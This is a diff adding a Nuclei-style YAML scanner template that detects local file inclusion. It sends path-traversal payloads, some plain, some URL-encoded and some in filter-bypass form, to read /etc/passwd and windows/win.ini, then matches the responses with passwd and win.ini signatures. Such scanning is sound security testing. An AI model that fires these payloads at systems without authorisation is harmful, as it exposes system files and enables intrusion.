@@ -1,0 +1,70 @@
+id: lfi-passwd-disclosure
+
+info:
+  name: Local File Inclusion - /etc/passwd Disclosure
+  author: sr7
+  severity: critical
+  description: |
+    Detects confirmed LFI via traversal in query parameters. Matches the
+    actual /etc/passwd format observed on the target, including app-specific
+    user entries (e.g., domain-based usernames).
+  reference:
+    - https://owasp.org/www-community/attacks/Path_Traversal
+  tags: lfi,traversal,vuln
+
+http:
+  - method: GET
+    path:
+      # --- Linux /etc/passwd (multiple depths + encodings) ---
+      - "{{BaseURL}}/index.php?page=../../../../../../etc/passwd"
+      - "{{BaseURL}}/index.php?page=../../../../../etc/passwd"
+      - "{{BaseURL}}/index.php?page=../../../../etc/passwd"
+      - "{{BaseURL}}/index.php?page=../../../etc/passwd"
+      - "{{BaseURL}}/index.php?page=../../etc/passwd"
+      - "{{BaseURL}}/index.php?page=../etc/passwd"
+      - "{{BaseURL}}/?page=../../../../../../etc/passwd"
+      - "{{BaseURL}}/index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+      - "{{BaseURL}}/index.php?page=....//....//....//....//etc/passwd"
+      
+      # --- Windows fallback ---
+      - "{{BaseURL}}/index.php?page=..\\..\\..\\..\\windows\\win.ini"
+      - "{{BaseURL}}/index.php?page=../../../../windows/win.ini"
+      - "{{BaseURL}}/templatize.asp?item=../../../../windows/win.ini"
+      
+    stop-at-first-match: true
+    redirects: true
+    max-redirects: 3
+
+    matchers-condition: or
+    matchers:
+      # --- Linux /etc/passwd: standard root entry ---
+      - type: regex
+        name: linux-passwd
+        part: body
+        regex:
+          - "root:[x*]?:0:0:[^:]*:/root:"
+          - "root:x:0:0:root:/root:"
+
+      # --- Linux: multiple passwd users (stronger evidence) ---
+      - type: regex
+        name: linux-passwd-multi
+        part: body
+        regex:
+          - "(?:daemon|bin|sys|nobody):[x*]?:\\d+:\\d+:"
+
+      # --- Windows signatures ---
+      - type: word
+        name: windows-winini
+        part: body
+        words:
+          - "[fonts]"
+          - "[extensions]"
+        condition: or
+
+      - type: word
+        name: windows-bootini
+        part: body
+        words:
+          - "[boot loader]"
+          - "[operating systems]"
+        condition: or
